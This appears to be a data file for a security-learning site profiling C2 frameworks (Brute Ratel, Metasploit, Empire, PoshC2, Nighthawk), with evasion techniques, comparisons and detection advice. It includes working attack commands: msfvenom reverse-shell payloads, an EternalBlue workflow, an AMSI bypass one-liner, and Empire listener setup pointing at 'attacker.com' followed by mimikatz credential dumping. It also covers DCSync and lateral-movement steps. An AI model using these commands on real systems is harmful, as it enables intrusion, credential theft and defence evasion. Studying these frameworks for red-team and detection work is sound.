The Badger is BRc4's implant, written in C/C++:

\`\`\`
┌────────────── Badger Architecture ──────────────┐
│                                                  │
│  ┌────────────┐  ┌────────────┐  ┌──────────┐  │
│  │   Direct   │  │   Sleep    │  │  Memory  │  │
│  │  Syscalls  │  │   Mask     │  │  Guard   │  │
│  └─────┬──────┘  └─────┬──────┘  └────┬─────┘  │
│        └───────────────┼───────────────┘        │
│                        │                         │
│              ┌─────────┴───────────┐            │
│              │    Badger Core      │            │
│              │  (Command Handler)  │            │
│              └─────────────────────┘            │
└──────────────────────────────────────────────────┘
\`\`\`

### Evasion Techniques

**Direct Syscalls**
BRc4 calls the Windows kernel directly, bypassing userland hooks:
- Reads syscall numbers from ntdll
- Executes syscall instruction directly
- No calls to hooked API functions

**Sleep Masking**
During sleep periods:
1. XOR encrypts Badger memory regions
2. Changes page permissions (RX → RW)
3. Obfuscates beacon signatures
4. Restores on wake

**Memory Guard**
Monitors for memory scans:
- Watches for suspicious memory access
- Can encrypt on-demand
- Detects EDR scanning patterns

**ETW Blinding**
Disables Event Tracing for Windows:
- Patches EtwEventWrite
- Blocks telemetry to EDR
- Targets specific providers

## Key Capabilities

### Advanced C2 Channels
\`\`\`
Protocols:
├── HTTP/HTTPS (malleable profiles)
├── DNS (encoded subdomains)
├── DoH/DoT (encrypted DNS)
├── SMB (named pipe pivoting)
└── TCP (direct connections)
\`\`\`

### LDAP Sentinel
Unique feature for monitoring AD queries:
- Watches for BloodHound/SharpHound
- Alerts on suspicious LDAP enumeration
- Helps operators avoid blue team traps

### DOH (DNS over HTTPS)
Built-in support for encrypted DNS:
\`\`\`
Providers:
- Cloudflare (1.1.1.1)
- Google (8.8.8.8)
- Custom resolvers
\`\`\`

### Credential Operations
- Windows Credential Manager access
- Browser credential extraction
- Kerberos ticket manipulation
- SAM/NTDS extraction

## Comparison with Cobalt Strike

| Feature | Cobalt Strike | Brute Ratel |
|---------|---------------|-------------|
| Userland hook bypass | BOF-dependent | Native |
| Sleep encryption | Malleable (basic) | Built-in |
| Memory obfuscation | Sleep mask kit | Native |
| Direct syscalls | BOF-dependent | Native |
| Price | $5,900/year | $2,500/year |
| Maturity | Very mature | Newer |
| Detection rate | High | Lower (2022-23) |

## Detection Considerations

### Why It's Hard to Detect
- No userland API calls to hook
- Encrypted during sleep
- Mimics legitimate traffic patterns
- ETW blind spots

### Detection Approaches
1. **Kernel-level monitoring**: ETW-Ti (Threat Intelligence)
2. **Hardware telemetry**: CPU performance counters
3. **Behavioral analysis**: Process behavior over time
4. **Network analysis**: HTTP/DNS patterns
5. **Memory forensics**: During active execution

### Known Indicators (evolving)
- Specific syscall patterns
- Sleep timing characteristics
- Network traffic signatures
- Loader artifacts

## Licensing & Access

BRc4 has strict licensing:
- Requires company verification
- Background checks on purchasers
- Annual license renewal
- License tied to specific users

## Learning Resources

- **Official Site**: https://bruteratel.com
- **Documentation**: Provided to license holders
- **Paranoid Ninja's Blog**: Technical research
- **Training**: Offered by the developer
- **Detection research**: Various security vendors publish analysis
    `,
    features: ["Badger agent", "EDR evasion", "Direct syscalls", "Sleep masking", "Memory encryption", "Unhooking", "LDAP sentinel", "SMB pivot", "DoH/DoT support", "Custom shellcode loader"],
    protocols: ["HTTP/HTTPS", "DNS", "SMB", "DoH", "DoT"],
    difficulty: "Advanced",
    cost: "Commercial ($2,500/user/year)",
    url: "https://bruteratel.com",
    useCases: ["EDR-heavy environments", "Advanced adversary simulation", "Mature security programs"],
    limitations: ["Expensive", "Licensing controversies", "Leaked versions in the wild"],
    versionHistory: [
      { version: "1.4+", date: "2023-2024", highlights: "Continued evasion improvements" },
      { version: "1.0-1.3", date: "2021-2022", highlights: "Initial releases, cracked version leak" },
    ],
    communityResources: [
      "Licensed user forums",
      "Paranoid Ninja Discord",
      "Training courses",
    ],
  },
  {
    name: "Metasploit Framework",
    type: "Open Source",
    language: "Ruby",
    description: "The world's most widely used penetration testing framework with Meterpreter payload",
    longDescription: "Metasploit is the foundational penetration testing framework, originally created by H.D. Moore in 2003 and now maintained by Rapid7. It revolutionized the security industry by democratizing access to exploit development and security testing. The framework includes over 2,500+ exploits, 1,100+ auxiliary modules, and 600+ post-exploitation modules. Meterpreter (Meta-Interpreter) is its advanced, dynamically extensible payload that operates entirely in memory, providing powerful post-exploitation capabilities. Metasploit is essential learning for any security professional and remains the gold standard for vulnerability validation.",
    deepDiveContent: `
## History & Background

Metasploit was created by **H.D. Moore** in 2003, initially as a portable network tool using Perl. It was rewritten in Ruby in 2007 and acquired by **Rapid7** in 2009. The framework fundamentally changed offensive security by making exploit development accessible.

### Impact on Security Industry
- Democratized penetration testing
- Standardized exploit framework concepts
- Created massive community contribution model
- Established payload/stager architecture patterns
- Influenced every C2 framework that followed

### Versions
- **Framework** (Free): Full open-source version
- **Pro** (Commercial): Enterprise features, reporting, automation
- **Express** (Discontinued): Mid-tier option

## Architecture Deep Dive

### Module Architecture
\`\`\`
metasploit-framework/
├── modules/
│   ├── exploits/      # ~2,500 exploits
│   │   ├── windows/
│   │   ├── linux/
│   │   ├── multi/
│   │   └── ...
│   ├── auxiliary/     # ~1,100 scanners/fuzzers
│   ├── post/          # ~600 post-exploitation
│   ├── payloads/      # Stagers, singles, stages
│   ├── encoders/      # Payload encoding
│   ├── nops/          # NOP generators
│   └── evasion/       # AV evasion templates
└── lib/
    └── msf/           # Core framework
\`\`\`

### Payload Architecture

**Singles (Inline)**
- Self-contained payloads
- All functionality in one payload
- Larger size, but no staging needed
- Example: \`windows/shell/reverse_tcp\` (staged) vs \`windows/shell_reverse_tcp\` (single)

**Stagers + Stages**
\`\`\`
┌──────────────────────────────────────────────────────┐
│                   Payload Flow                        │
├──────────────────────────────────────────────────────┤
│                                                       │
│   ┌─────────┐        ┌─────────┐       ┌──────────┐ │
│   │ Stager  │───────>│  Stage  │──────>│ Handler  │ │
│   │ (small) │        │ (large) │       │ (msfcon) │ │
│   └─────────┘        └─────────┘       └──────────┘ │
│                                                       │
│   Stager: Establishes connection, downloads stage     │
│   Stage: Full Meterpreter sent over connection        │
│   Handler: msfconsole multi/handler                   │
└──────────────────────────────────────────────────────┘
\`\`\`

### Meterpreter Architecture
Meterpreter is Metasploit's advanced payload:
- **In-memory execution**: No disk artifacts
- **Encrypted communication**: TLS by default
- **Extensible**: Load modules on-demand
- **Cross-platform**: Windows, Linux, macOS, Android, PHP, Java
- **Reflective loading**: DLL injection without file

## Key Capabilities

### Exploit Database
\`\`\`
msf6> search type:exploit platform:windows cve:2021

# Categories include:
- Remote Code Execution
- Privilege Escalation  
- Web Application
- Client-Side
- Local Exploits
\`\`\`

### Post-Exploitation Modules
\`\`\`
# Windows post modules
meterpreter> run post/windows/gather/hashdump
meterpreter> run post/windows/gather/credentials/credential_collector
meterpreter> run post/windows/manage/migrate
meterpreter> run post/multi/recon/local_exploit_suggester

# Multi-platform
meterpreter> run post/multi/gather/ssh_creds
meterpreter> run post/multi/manage/shell_to_meterpreter
\`\`\`

### Pivoting & Routing
\`\`\`
# Add route through meterpreter session
msf6> route add 10.10.10.0/24 1

# SOCKS proxy
msf6> use auxiliary/server/socks_proxy
msf6> set SRVPORT 1080
msf6> run

# Port forwarding
meterpreter> portfwd add -l 3389 -p 3389 -r 10.10.10.5
\`\`\`

### msfvenom Payload Generation
\`\`\`bash
# Windows executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f exe -o shell.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f elf -o shell

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f psh-cmd

# Shellcode (for custom loaders)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f c

# With encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe
\`\`\`

## Why Metasploit Is Heavily Detected

### Known Signatures
- Default shellcode patterns
- Meterpreter memory structures
- TLV (Type-Length-Value) communication protocol
- Standard stager behavior
- Known file hashes

### When to Use vs. Not Use
**Use Metasploit For:**
- Learning exploitation
- CTF competitions
- Vulnerability validation
- Undefended networks
- Initial access (then migrate to stealthier C2)

**Don't Use For:**
- Operations against EDR
- Long-term persistence
- Stealth-required scenarios
- Advanced adversary simulation

## Detection Considerations

### Network Signatures
- TLV protocol patterns
- Default SSL certificates
- Stager network patterns
- Known callback URIs

### Host Indicators
- Reflective DLL loading
- Specific memory signatures
- Process injection patterns
- Well-documented YARA rules

### YARA Rule Example
\`\`\`yara
rule Meterpreter_Reverse_TCP {
    meta:
        description = "Detects Meterpreter reverse TCP payload"
    strings:
        $s1 = { 6A 05 FF D6 50 50 68 EA 0F DF E0 }
        $s2 = { FC E8 8F 00 00 00 }
    condition:
        any of them
}
\`\`\`

## Getting Started Tutorial

\`\`\`bash
# Install on Kali (pre-installed)
# Or on other Linux:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall && ./msfinstall

# Initialize database
msfdb init

# Start msfconsole
msfconsole

# Basic exploitation workflow
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue)> set RHOSTS 10.10.10.5
msf6 exploit(ms17_010_eternalblue)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue)> set LHOST 10.0.0.1
msf6 exploit(ms17_010_eternalblue)> exploit

# Post-exploitation
meterpreter> getuid
meterpreter> sysinfo
meterpreter> hashdump
meterpreter> getsystem
meterpreter> migrate -P explorer.exe
\`\`\`

## Learning Resources

- **Official Docs**: https://docs.metasploit.com/
- **Offensive Security**: OSCP/PWK heavily features Metasploit
- **Metasploit Unleashed**: Free online course
- **Rapid7 Blog**: New module announcements
- **GitHub**: https://github.com/rapid7/metasploit-framework
- **Exploit-DB**: Searchable exploit database
    `,
    features: [
      "2,500+ Exploit modules",
      "Meterpreter advanced payload",
      "1,100+ Auxiliary modules", 
      "600+ Post-exploitation modules",
      "msfvenom payload generator",
      "Multi-platform support",
      "Session management",
      "Pivoting & port forwarding",
      "Credential harvesting",
      "Database integration",
      "Resource scripting",
      "Active Directory attacks",
      "Web application testing",
      "Extensive documentation"
    ],
    protocols: ["HTTP/HTTPS", "TCP", "UDP", "Reverse shells", "Bind shells", "Named pipes", "DNS"],
    difficulty: "Beginner",
    cost: "Free (Pro version available at $15,000/year)",
    url: "https://www.metasploit.com",
    useCases: [
      "Learning exploitation fundamentals",
      "Penetration testing",
      "Vulnerability validation",
      "CTF competitions",
      "Security research",
      "Red team initial access",
      "Payload development learning"
    ],
    limitations: [
      "Heavily signatured by AV/EDR",
      "Not designed for stealth operations",
      "Limited OPSEC features compared to modern C2s",
      "Meterpreter easily detected in memory",
      "Network traffic patterns well-known"
    ],
    extendedContent: true, // Flag to render extended Metasploit section
    versionHistory: [
      { version: "6.x", date: "2020-present", highlights: "Ruby 3 support, continued updates" },
      { version: "5.x", date: "2019-2020", highlights: "JSON RPC, database improvements" },
      { version: "4.x", date: "2011-2019", highlights: "Pro integration, major growth" },
    ],
    communityResources: [
      "GitHub Discussions",
      "Rapid7 Community",
      "r/metasploit subreddit",
      "Discord servers",
    ],
  },
  {
    name: "Empire/Starkiller",
    type: "Open Source",
    language: "Python/PowerShell/C#",
    description: "PowerShell and Python-based post-exploitation framework",
    longDescription: "Empire was originally developed by @harmj0y and @sixdub, and is now maintained by BC-Security. It specializes in PowerShell and Python-based post-exploitation with a focus on Windows Active Directory environments. Starkiller provides a modern GUI frontend, replacing the original command-line interface.",
    deepDiveContent: `
## History & Background

Empire has a rich history in the offensive security community:

**Timeline:**
- **2015**: Original Empire released by @harmj0y and @sixdub
- **2019**: Original project deprecated
- **2020**: BC-Security forks and revives as Empire 4.0
- **2021+**: Starkiller GUI added, Python 3 rewrite

Empire was groundbreaking because it brought sophisticated PowerShell post-exploitation to the masses, implementing techniques from research by @harmj0y, @mattifestation, and others.

## Architecture Deep Dive

### Server/Client Model
\`\`\`
┌────────────────── Empire Architecture ──────────────────┐
│                                                          │
│  ┌──────────────────────────────────────────────────┐   │
│  │           Empire Server (Python)                  │   │
│  ├──────────────┬──────────────┬──────────────────┤   │
│  │  Listeners   │   Database   │    REST API       │   │
│  │  (HTTP/DNS)  │   (SQLite)   │                   │   │
│  └──────┬───────┴──────────────┴────────┬─────────┘   │
│         │                                │             │
│   ┌─────┴─────┐                   ┌──────┴──────┐     │
│   │  Agents   │                   │  Starkiller │     │
│   │ (PS/Py/C#)│                   │    (GUI)    │     │
│   └───────────┘                   └─────────────┘     │
└──────────────────────────────────────────────────────────┘
\`\`\`

### Agent Types

| Agent | Language | Platform | Use Case |
|-------|----------|----------|----------|
| PowerShell | PowerShell | Windows | Primary Windows agent |
| Python | Python | Linux/macOS | Cross-platform |
| C# | C# | Windows | .NET environments |
| IronPython | IronPython | Windows | Python without interpreter |

### Listener Types
- **HTTP**: Standard web traffic
- **HTTP COM**: Uses COM objects for traffic
- **HTTP Foreign**: Accepts connections from other frameworks
- **Malleable**: Cobalt Strike-compatible profiles
- **OneDrive**: Uses OneDrive as dead drop
- **Dropbox**: Uses Dropbox as dead drop

## Key Capabilities

### PowerShell Tradecraft
Empire pioneered many PowerShell techniques:

**In-Memory Execution**
\`\`\`powershell
# Empire agents run entirely in memory
# No powershell.exe - uses System.Management.Automation
$ps = [PowerShell]::Create()
$ps.AddScript($script).Invoke()
\`\`\`

**AMSI Bypass**
\`\`\`powershell
# Empire includes AMSI patches
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
\`\`\`

**PowerView Integration**
Built-in AD reconnaissance:
- Get-DomainUser
- Get-DomainGroup  
- Get-DomainComputer
- Find-LocalAdminAccess
- Get-NetSession

### Module Library
\`\`\`
modules/
├── code_execution/
│   ├── invoke_assembly
│   ├── invoke_bof
│   └── invoke_shellcode
├── collection/
│   ├── keylogger
│   ├── screenshot
│   └── clipboard
├── credentials/
│   ├── mimikatz/
│   ├── kerberoast
│   └── dcsync
├── lateral_movement/
│   ├── invoke_psexec
│   ├── invoke_wmi
│   └── invoke_smbexec
├── persistence/
│   ├── registry
│   ├── scheduled_task
│   └── wmi_subscription
├── privesc/
│   ├── bypassuac_*
│   ├── powerup
│   └── getsystem
└── situational_awareness/
    ├── network/
    └── host/
\`\`\`

### Active Directory Attacks
\`\`\`
# Kerberoasting
(Empire: agent) > usemodule credentials/kerberoast
(Empire: kerberoast) > execute

# DCSync
(Empire: agent) > usemodule credentials/mimikatz/dcsync
(Empire: dcsync) > set user krbtgt
(Empire: dcsync) > execute

# Golden Ticket
(Empire: agent) > usemodule credentials/mimikatz/golden_ticket
\`\`\`

### Starkiller GUI
The modern web interface provides:
- Visual agent management
- Task queuing and results
- Module search and configuration
- Reporting and timelines
- Multi-user support

## Detection Considerations

### PowerShell Monitoring
Empire agents trigger:
- Script Block Logging (4104)
- Module Logging
- PowerShell Transcription
- AMSI events

### Network Indicators
- HTTP callback patterns
- Cookie/header-based staging
- Default profile indicators
- Base64 in communications

### Host Indicators
- PowerShell execution without powershell.exe
- System.Management.Automation loading
- Known obfuscation patterns
- Memory signatures

### Defensive Recommendations
1. **Enable PowerShell logging**: Script Block + Module logging
2. **AMSI integration**: Ensure AMSI is active
3. **PowerShell Constrained Language Mode**: Blocks many techniques
4. **Application whitelisting**: Block unauthorized PS execution
5. **Monitor for known techniques**: PowerView, Mimikatz patterns

## Getting Started Tutorial

\`\`\`bash
# Install Empire
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
./setup/install.sh

# Start the server
sudo ./ps-empire server

# In another terminal, start Starkiller
./starkiller

# Or use CLI
sudo ./ps-empire client

# CLI Workflow
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://attacker.com:80
(Empire: listeners/http) > set Port 80
(Empire: listeners/http) > execute

# Generate launcher
(Empire) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute

# Interact with agent
(Empire) > agents
(Empire) > interact <agent_name>
(Empire: <agent>) > sysinfo
(Empire: <agent>) > usemodule credentials/mimikatz/logonpasswords
(Empire: mimikatz/logonpasswords) > execute
\`\`\`

## Learning Resources

- **BC-Security GitHub**: https://github.com/BC-SECURITY/Empire
- **BC-Security Blog**: Technical articles
- **Starkiller**: https://github.com/BC-SECURITY/Starkiller
- **Documentation**: https://bc-security.gitbook.io/empire-wiki
- **YouTube**: BC-Security channel
- **Training**: BC-Security offers courses
    `,
    features: ["PowerShell agents", "Python agents", "C# agents", "Starkiller GUI", "Module library", "Listener types", "Malleable profiles", "IronPython agent", "Credential database", "Plugin system"],
    protocols: ["HTTP/HTTPS", "Dropbox", "OneDrive", "Malleable"],
    difficulty: "Beginner",
    cost: "Free",
    url: "https://github.com/BC-SECURITY/Empire",
    useCases: ["Active Directory attacks", "PowerShell-based operations", "Learning post-exploitation"],
    limitations: ["PowerShell heavily monitored", "AMSI can block agents", "Needs obfuscation"],
    versionHistory: [
      { version: "5.x", date: "2023-2024", highlights: "C# agents, improvements" },
      { version: "4.x", date: "2020-2022", highlights: "BC-Security revival, Python 3" },
      { version: "3.x", date: "2017-2019", highlights: "Original project" },
    ],
    communityResources: [
      "BC-Security Discord",
      "GitHub Discussions",
      "Twitter @BCSecurity1",
      "YouTube tutorials",
    ],
  },
  {
    name: "PoshC2",
    type: "Open Source",
    language: "Python/PowerShell/C#",
    description: "Proxy-aware C2 framework with multiple implant types",
    longDescription: "PoshC2 is a proxy-aware C2 framework written by Nettitude. It supports multiple implant types including PowerShell, C#, and Python, making it versatile for different environments. The framework is designed to be modular and extensible with a focus on operational flexibility.",
    deepDiveContent: `
## History & Background

PoshC2 was developed by **Ben Turner** and the team at **Nettitude** (an NCC Group company). Released as open source, it was designed to provide a practical C2 framework for real-world penetration testing engagements where complex proxy configurations are common.

### Design Philosophy
- **Proxy-awareness**: Works through complex enterprise proxy chains
- **Flexibility**: Multiple implant types and communication methods
- **Practicality**: Built by pentesters for real-world engagements
- **Simplicity**: Easy to deploy and operate

## Architecture Deep Dive

### Component Overview
\`\`\`
┌────────────────── PoshC2 Architecture ──────────────────┐
│                                                          │
│  ┌──────────────────────────────────────────────────┐   │
│  │           PoshC2 Server (Python)                  │   │
│  ├──────────────┬──────────────┬──────────────────┤   │
│  │   C2 Server  │   Database   │    File Server    │   │
│  │   (HTTP/S)   │   (SQLite)   │                   │   │
│  └──────┬───────┴──────────────┴──────────────────┘   │
│         │                                               │
│   ┌─────┴──────────────────────────────────┐           │
│   │            Implant Types               │           │
│   ├────────────┬────────────┬─────────────┤           │
│   │ PoshC2.PS  │ Sharp.C#   │  PoshC2.Py  │           │
│   │ PowerShell │   C#       │   Python    │           │
│   └────────────┴────────────┴─────────────┘           │
└──────────────────────────────────────────────────────────┘
\`\`\`

### Implant Types

| Implant | Language | Platforms | Notes |
|---------|----------|-----------|-------|
| PoshC2.PS | PowerShell | Windows | Full PowerShell capabilities |
| Sharp | C# | Windows | .NET, better evasion |
| PoshC2.Py | Python | Linux/macOS | Cross-platform support |
| FComm | File-based | Air-gapped | For isolated networks |

### Communication Mechanisms
- **HTTP/HTTPS**: Standard web traffic with proxy support
- **DNS**: Tunnel data in DNS queries/responses
- **Daisy-chaining**: Route through other implants
- **FComm**: File-based for air-gapped networks

## Key Capabilities

### Exceptional Proxy Support
PoshC2 excels at proxy traversal:
\`\`\`powershell
# Uses system proxy settings automatically
# Supports proxy authentication (NTLM, Basic)
# Works with PAC files
# Handles corporate proxy chains
# Domain fronting capable
\`\`\`

### Payload Generation
\`\`\`bash
# Generate various payloads from the implant handler:
# - PowerShell one-liners
# - C# executables (EXE/DLL)
# - Python payloads
# - HTA files
# - VBA macros
# - JScript/VBScript
# - Shellcode
# - MSBuild XML
\`\`\`

### Module Library
Organized by category:
- **Credentials**: Mimikatz, Kerberos attacks, credential manager
- **Lateral Movement**: WMI, PSExec, DCOM, WinRM
- **Persistence**: Registry, scheduled tasks, WMI subscriptions
- **Enumeration**: PowerView, SharpHound, network scanning
- **Privilege Escalation**: Various local and domain techniques

### Command Examples
\`\`\`
# Implant interaction
PoshC2> searchhelp credential
PoshC2> loadmodule Invoke-Mimikatz.ps1
PoshC2> invoke-mimikatz -dumpcreds

# Lateral movement
PoshC2> invoke-wmiexec -target 10.0.0.5 -command "whoami"
PoshC2> invoke-psexec -target 10.0.0.5
PoshC2> invoke-dcom -target 10.0.0.5 -method mmc20

# Persistence
PoshC2> install-persistence -regkey
PoshC2> install-persistence -scheduledtask

# Network enumeration
PoshC2> portscan 10.0.0.0/24 22,80,443,445,3389
\`\`\`

### Daisy-Chaining
Route implants through each other for segmented networks:
\`\`\`
                      Internal Network
Internet → ┌─────────┐     ┌─────────┐     ┌─────────┐
           │ Implant │ ──> │ Implant │ ──> │ Implant │
           │ (DMZ)   │     │ (Tier1) │     │ (Tier2) │
           └─────────┘     └─────────┘     └─────────┘
              ↑                               ↑
         Egress point                  Isolated target
\`\`\`

## Detection Considerations

### Network Indicators
- HTTP callback patterns (customizable)
- DNS tunneling signatures
- Default User-Agent strings (should be changed)
- URL patterns (configurable)

### Host Indicators
- PowerShell execution patterns
- .NET assembly loading for Sharp implants
- Process genealogy anomalies
- Memory signatures of implants

### Defensive Recommendations
1. Monitor PowerShell logging (Script Block, Module, Transcription)
2. Deploy AMSI and ensure it's not bypassed
3. Analyze DNS query patterns for tunneling
4. Profile proxy traffic for anomalies
5. Endpoint detection for known implant patterns

## Getting Started Tutorial

\`\`\`bash
# Clone repository
git clone https://github.com/nettitude/PoshC2.git
cd PoshC2

# Install dependencies
sudo ./Install.sh

# Create new project
posh-project -n myproject

# Configure settings
# Edit poshc2_server_config.yml
# Set:
#   - PayloadCommsHost (your C2 URL)
#   - DomainFrontHeader (optional)
#   - DefaultSleep (beacon interval)

# Start server
posh-server

# In another terminal, start implant handler
posh

# Generate payloads from ImplantHandler
# Options include: PowerShell, Sharp, Python, HTA, etc.

# Deploy to target and interact via PoshC2 console
\`\`\`

## Learning Resources

- **GitHub**: https://github.com/nettitude/PoshC2
- **Documentation**: https://poshc2.readthedocs.io/
- **Nettitude Blog**: Technical articles and case studies
- **YouTube**: Setup and operation tutorials
- **Twitter**: @naboris, @Nettaboris
    `,
    features: ["Multiple implant types", "Proxy aware", "Domain fronting", "SOCKS proxy", "Daisy chaining", "Modular design", "Reporting", "Sharp implants", "Cross-platform"],
    protocols: ["HTTP/HTTPS", "DNS"],
    difficulty: "Intermediate",
    cost: "Free",
    url: "https://github.com/nettitude/PoshC2",
    useCases: ["Proxy-heavy environments", "Multi-platform needs", "Flexible operations"],
    limitations: ["Smaller community", "Less documentation", "Fewer integrations"],
    versionHistory: [
      { version: "8.x", date: "2023-2024", highlights: "Python 3, Sharp improvements, stability" },
      { version: "7.x", date: "2021-2022", highlights: "Major refactor, improved Sharp" },
      { version: "6.x", date: "2020", highlights: "FComm, enhanced daisy-chaining" },
    ],
    communityResources: [
      "GitHub Issues and Discussions",
      "Nettitude Labs Discord",
      "Twitter @naboris",
      "PoshC2 ReadTheDocs",
    ],
  },
  {
    name: "Nighthawk",
    type: "Commercial",
    language: "C/C++",
    description: "Highly evasive commercial C2 from MDSec",
    longDescription: "Nighthawk is MDSec's commercial C2 framework, designed from the ground up for evasion. It uses advanced techniques to avoid detection by modern security tools and provides operators with granular control over implant behavior. Access is restricted to vetted organizations.",
    deepDiveContent: `
## History & Background

Nighthawk is a commercial C2 framework developed by **MDSec** (formerly Moloch Dev). Released as a commercial product for authorized red teams, it's designed specifically for operations against mature security environments with advanced EDR deployments.

### Market Position
Nighthawk competes directly with:
- Brute Ratel C4
- Cobalt Strike (heavily modified)
- Other premium commercial C2s

It differentiates by focusing heavily on detection evasion and operational security from the ground up.

### Controversy
Like Brute Ratel, Nighthawk has been observed in use by sophisticated threat actors, highlighting the challenges of commercial offensive tool distribution. This has led to increased security research and detection capabilities targeting the framework.

## Architecture Deep Dive

### Design Principles
\`\`\`
┌────────────────── Nighthawk Philosophy ──────────────────┐
│                                                           │
│   1. OPSEC First: Every feature designed for stealth     │
│   2. EDR Awareness: Built to bypass modern defenses      │
│   3. Memory Safety: Minimize forensic artifacts          │
│   4. Traffic Blending: Appear as legitimate traffic      │
│   5. Flexibility: Adapt to any operational environment   │
│                                                           │
└───────────────────────────────────────────────────────────┘
\`\`\`

### Agent Architecture
The Nighthawk agent employs multiple evasion layers simultaneously:

**Direct Syscalls**
- Bypasses userland API hooks entirely
- Dynamically resolves syscall numbers
- No calls to hooked ntdll.dll exports
- Adapts to different Windows versions

**Sleep Masking**
- Encrypts agent memory regions during sleep
- Changes memory permissions (RWX → RW)
- Defeats memory scanning during idle
- Configurable sleep intervals with jitter

**Call Stack Spoofing**
- Spoofs return addresses on call stack
- Defeats stack-based detection heuristics
- Mimics legitimate call chains
- Chains through known good modules

**Module Stomping**
- Loads code into legitimate signed modules
- Avoids suspicious memory allocations
- Blends with normal process memory map
- Harder to identify in memory forensics

## Key Capabilities

### Communication Channels
| Channel | Description | OPSEC Rating |
|---------|-------------|--------------|
| HTTP/S | Standard web traffic with malleable profiles | Medium |
| DNS | Covert channel via DNS queries | High |
| DoH/DoT | Encrypted DNS (Cloudflare, Google) | Very High |
| SMB | Internal lateral movement | High |

### Execution Methods
- Multiple process injection techniques
- Thread execution hijacking
- Module stomping variants
- Direct assembly execution
- Cobalt Strike BOF compatibility
- Custom BOF development support

### Post-Exploitation Features
- Credential access (multiple techniques)
- Advanced lateral movement
- Granular persistence mechanisms
- File operations with OPSEC options
- Network reconnaissance
- Token manipulation

### Pivoting Capabilities
- SOCKS proxy with traffic masking
- Port forwarding
- SMB-based pivoting
- Daisy-chain agents
- Multi-hop tunnels

## Evasion Techniques Comparison

### Compared to Other Premium C2s

| Technique | Cobalt Strike | Brute Ratel | Nighthawk |
|-----------|---------------|-------------|-----------|
| Direct syscalls | BOF-dependent | Native | Native |
| Sleep encryption | Sleep Mask Kit | Native | Multi-layer |
| Call stack spoof | Arsenal Kit | Yes | Advanced |
| ETW bypass | Malleable | Yes | Comprehensive |
| Memory encryption | Basic | Yes | Extensive |
| Module stomping | No | Partial | Yes |

### Advanced Protections
- Kernel callback awareness
- Hardware breakpoint detection
- Anti-debugging techniques
- VM/sandbox detection (optional)
- Anti-forensics capabilities

## Detection Considerations

### Why Nighthawk Is Difficult to Detect
- Minimal to no userland API calls that EDRs hook
- Encrypted in-memory footprint during sleep
- Legitimate-looking call stacks defeat heuristics
- Traffic blends with normal HTTPS/DNS

### Detection Strategies That Can Work
1. **Kernel-level telemetry**: ETW-Ti (Threat Intelligence provider)
2. **Hardware events**: CPU performance counter monitoring
3. **Network behavioral analysis**: Long-term beaconing patterns
4. **Memory forensics**: During active execution windows
5. **Behavioral analytics**: Process behavior over extended time

### Security Vendor Research
Major security vendors periodically publish detection research:
- Memory signature analysis (when active)
- Network traffic pattern identification
- Behavioral indicators and heuristics
- Loader/dropper artifact analysis

## Access & Licensing

### Requirements for Purchase
- Commercial license (pricing not public, reportedly $10,000+/year)
- Organization verification process
- Legitimate business use case required
- Likely background/reference checks
- Restricted geographical availability

### Target Market
- Enterprise red teams at mature organizations
- Advanced security consultancies
- Government-sanctioned offensive operations
- Organizations with genuine need for EDR bypass testing

## Learning Resources

- **Official Site**: https://www.mdsec.co.uk/nighthawk/
- **MDSec Blog**: Occasional technical articles and research
- **Security Research Papers**: Vendor detection reports
- **Threat Intelligence**: Reports analyzing in-the-wild usage
- **Licensed Documentation**: Comprehensive docs for customers

**Note**: Due to its commercial nature and controlled distribution, detailed tutorials, technical documentation, and operational guides are only available to verified licensed users through MDSec's customer portal.

## Comparison Summary

### When to Choose Nighthawk Over Alternatives

| Scenario | Recommendation |
|----------|----------------|
| Budget-conscious | Sliver, Mythic (free) |
| Learning C2 | Metasploit, Sliver |
| EDR bypass required | Nighthawk, Brute Ratel |
| Maximum stealth | Nighthawk |
| Mature red team | Nighthawk, Cobalt Strike |
| Cross-platform needs | Sliver, Mythic |
    `,
    features: ["Advanced evasion", "Customizable profiles", "In-memory execution", "Process injection", "Syscall obfuscation", "Sleep obfuscation", "ETW patching", "Callback masking"],
    protocols: ["HTTP/HTTPS", "DNS", "SMB"],
    difficulty: "Advanced",
    cost: "Commercial (pricing not public)",
    url: "https://www.mdsec.co.uk/nighthawk/",
    useCases: ["High-security environments", "Advanced adversary simulation", "Mature red teams"],
    limitations: ["Very expensive", "Restricted access", "Limited public information"],
    versionHistory: [
      { version: "Current", date: "2023-2024", highlights: "Continuous evasion updates, new techniques" },
      { version: "Previous", date: "2021-2022", highlights: "Initial market presence" },
    ],
    communityResources: [
      "Licensed user forums (private)",
      "MDSec support channels",
      "Private training offerings",
      "Customer Slack/Discord",
    ],
  },
];

// Communication protocols with expanded details
const c2Protocols = [
  {
    protocol: "HTTP/HTTPS",
    description: "Web traffic blending - most common and flexible",
    longDescription: "HTTP/HTTPS is the most widely used C2 protocol because it blends with legitimate web traffic. Organizations expect to see HTTP traffic leaving their network, making it difficult to block without breaking business operations. HTTPS adds encryption, preventing content inspection without SSL/TLS interception.",
    pros: ["Blends with normal traffic", "Proxy support", "Customizable headers/URIs", "Wide firewall acceptance", "Can mimic legitimate applications"],
    cons: ["SSL inspection can expose traffic", "Detectable beaconing patterns", "Logs often captured by proxies", "JA3 fingerprinting possible"],
